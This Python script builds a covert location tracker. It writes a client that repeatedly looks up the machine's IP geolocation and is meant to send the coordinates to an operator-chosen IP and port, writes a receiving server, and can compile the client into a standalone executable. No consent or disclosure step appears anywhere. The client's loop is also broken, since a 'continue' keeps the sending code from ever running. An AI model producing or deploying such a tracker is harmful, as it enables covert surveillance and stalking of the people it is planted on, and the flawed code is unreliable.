#!/bin/python3.9
import subprocess
import shlex

HOST = input("Enter your IP Address: ")
PORT = input("Enter server port: ")
time_Interval = input("Enter time interval (in seconds): ")

gps = f'''
#!/bin/python3.9
from urllib.request import urlopen
import json
import socket
import time

while True:

    RHOSTS = "{HOST}"
    RPORT = {PORT}
    separator = " , "

    url = "https://ipinfo.io/json"
    req = urlopen(url)
    data = json.load(req)

    lat = data['loc'].split(",")[0]
    lon = data['loc'].split(",")[1]

    location = lat, separator,  lon
    coordinates = "".join(location)
    print(coordinates)

    filename = "location.txt"

    with open(filename, "w") as thefile:
        contents = f"Location : " + coordinates #Add new line after generating
        thefile.write(contents)
        continue

    with open(filename, "rb") as sendFile:
        sendFile = sendFile.read()
        s = socket.socket()
        s.connect((RHOSTS, RPORT))
        s.send(sendFile)
        print("Location sent...")
        time.sleep({time_Interval})

'''
server = f'''
#!/bin/python3.9
import socket
import sys

s = socket.socket()
s.bind(("{HOST}",{PORT})) #Change these
print("Listening...")
s.listen(10)
i=1

while True:
    sc, address = s.accept()
    print(address)
    f = open('location.txt','ab+') #open in binary
    l = 1
    while(l):
        l = sc.recv(1024)
        while (l):
            f.write(l)
            with open('location.txt', 'r') as thefile:
                contents = thefile.read()
                print(contents)
            l = sc.recv(1024)
            with open('location.txt', 'r') as thefile:
                contents = thefile.read()
                print(contents)
        f.close()

    sc.close()

s.close()
'''

filename = input("What would you like to save your file as? ")
with open(filename, "w") as thefile:
    thefile.write(gps)
    print("File generated...")

with open("server.py", "w") as theserver:
    theserver.write(server)
    print("Server created...")

cont = input("Would you like to compile an executable? (y/n) ")
if cont == "y":
    comp = f"pyinstaller --onefile {filename}"
    subprocess.call(shlex.split(comp))
elif cont == "n":
    print("Thanks for using...")
    exit()
